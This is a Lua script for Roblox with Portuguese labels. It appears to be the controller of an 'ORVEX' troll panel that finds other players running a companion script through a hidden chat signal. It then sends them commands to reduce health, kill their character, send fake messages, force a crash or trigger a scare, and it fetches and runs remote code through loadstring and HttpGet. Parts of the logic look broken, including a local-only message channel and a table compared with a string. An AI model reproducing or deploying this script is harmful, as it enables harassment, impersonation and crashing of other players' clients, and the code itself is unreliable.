local DONO_USERID = 2980742903
local Players = game:GetService("Players")
local jogador = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")
local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)

if jogador.UserId ~= DONO_USERID then jogador:Kick("Acesso negado.") return end

local clientesAtivos = {}
local usuarioSelecionadoTroll = ""
local textoFakeMensagem = ""

TextChatService.OnIncomingMessage = function(mensagemObj)
    local texto = mensagemObj.Text
    local remetente = mensagemObj.TextSource
    if texto == "new123" and remetente then
        local playerInstancia = Players:GetPlayerByUserId(remetente.UserId)
        if playerInstancia and playerInstancia ~= jogador then
            clientesAtivos[playerInstancia.Name] = os.clock()
        end
        mensagemObj.Text = ""
        return nil
    end
end

local function obterListaJogadoresDedicada()
    local lista = {}
    local tempoLimite = os.clock() - 25
    for nome, t in pairs(clientesAtivos) do
        if Players:FindFirstChild(nome) and t > tempoLimite then
            table.insert(lista, nome)
        else
            clientesAtivos[nome] = nil
        end
    end
    if #lista == 0 then return {"Nenhum usuário detectado"} end
    return lista
end

local function enviarComandoRede(cmd, arg, forcarSemAlvo)
    if (usuarioSelecionadoTroll ~= "" and usuarioSelecionadoTroll ~= "Nenhum usuário detectado") or forcarSemAlvo then
        if canalGeral then
            pcall(function()
                -- Envia em formato de SystemMessage local, impedindo o envio ao servidor global
                if forcarSemAlvo and cmd == "SolicitarVerificacao" then
                    canalGeral:DisplaySystemMessage("[ORVEX-SYS-REQ]")
                else
                    canalGeral:DisplaySystemMessage(string.format("[ORVEX-SYS-CMD] %s | %s", cmd, arg))
                end
            end)
        end
    end
end

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/gen2"))()
local Window = Rayfield:CreateWindow({
    name = "ORVEX | ADMIN PAINEL", 
    subtitle = "Gerenciamento Otimizado", 
    theme = "Default"
})

local TabMonitor = Window:CreateTab({ name = "Monitor", icon = "rbxassetid://100604009889706" })
local TabTroll = Window:CreateTab({ name = "Troll", icon = "rbxassetid://10651147057" })

TabMonitor:CreateSection({ name = "Gerenciamento e Varredura Manual" })
TabMonitor:CreateButton({
    name = "Verificar Rede (Detectar Usuários)",
    Callback = function()
        enviarComandoRede("SolicitarVerificacao", "true", true)
        Window:Notify({title = "Varredura", content = "Sinal local enviado de forma invisível!", duration = 3})
    end
})

local LabelContador = TabMonitor:CreateText({ name = "Contador", text = "Usuários com script ativo: 0" })
local LabelLista = TabMonitor:CreateText({ name = "Usuários Online", text = "Aperte em Verificar Rede para escanear." })

local DropdownTroll = TabTroll:CreateDropdown({
    name = "Selecionar Alvo da Rede",
    options = obterListaJogadoresDedicada(),
    currentOption = "",
    multipleOptions = false,
    callback = function(opcao) usuarioSelecionadoTroll = opcao end
})

TabTroll:CreateButton({name = "Reduzir Vitalidade", callback = function() enviarComandoRede("Danificar", "25") end})
TabTroll:CreateButton({name = "Eliminar Personagem", Callback = function() enviarComandoRede("Danificar", "0") end})

TabTroll:CreateInput({name = "Texto Fake", placeholderText = "Escreva aqui...", callback = function(t) textoFakeMensagem = t end})
TabTroll:CreateButton({name = "Enviar Mensagem Simulada", Callback = function() enviarComandoRede("FakeMessage", textoFakeMensagem) end})
TabTroll:CreateButton({name = "Provocar Travamento (Crash)", Callback = function() enviarComandoRede("ForcarCrash", "true") end})
TabTroll:CreateToggle({name = "Efeito Susto", currentValue = false, callback = function(v) enviarComandoRede("EfeitoSusto", v and "ATIVAR" or "DESATIVAR") end})

task.spawn(function()
    while task.wait(2) do
        pcall(function()
            local ativos = obterListaJogadoresDedicada()
            DropdownTroll:Refresh(ativos)
            if ativos == "Nenhum usuário detectado" then
                LabelContador:Set("Usuários com script ativo: 0")
                LabelLista:Set("Online: Nenhum")
            else
                LabelContador:Set("Usuários com script ativo: " .. #ativos)
                LabelLista:Set("Online: " .. table.concat(ativos, ", "))
            end
        end)
    end
end)
